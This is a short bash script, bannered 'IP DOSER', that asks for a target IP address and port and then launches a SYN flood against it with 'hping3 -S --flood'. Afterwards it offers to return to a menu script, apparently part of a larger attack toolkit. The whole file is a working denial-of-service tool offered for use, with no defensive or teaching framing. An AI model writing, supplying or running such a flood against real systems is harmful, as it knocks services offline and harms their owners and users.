#! /bin/bash
echo "
    ________     ____  ____  _____ __________ 
   /  _/ __ \   / __ \/ __ \/ ___// ____/ __ \
   / // /_/ /  / / / / / / /\__ \/ __/ / /_/ /
 _/ // ____/  / /_/ / /_/ /___/ / /___/ _, _/ 
/___/_/      /_____/\____//____/_____/_/ |_|  
                                              
"
read -r -p "Input IP target - " IP
read -r -p "Input port target - " PORT
sudo hping3 -S --flood -V -p $PORT $IP
while true
do
 read -r -p "Do you want start script again ? (y/n) - " start
 
 case $start in
     [yY][eE][sS]|[yY])
  cd ..
  clear
  ./K0Z1OLMENU.sh
 break
 ;;
     [nN][eE][sS]|[nN])
  echo "Thanks for using my script !"
  exit 1
 break
        ;;
     *)
 echo "Invalid input..."
  ;;
  esac
done

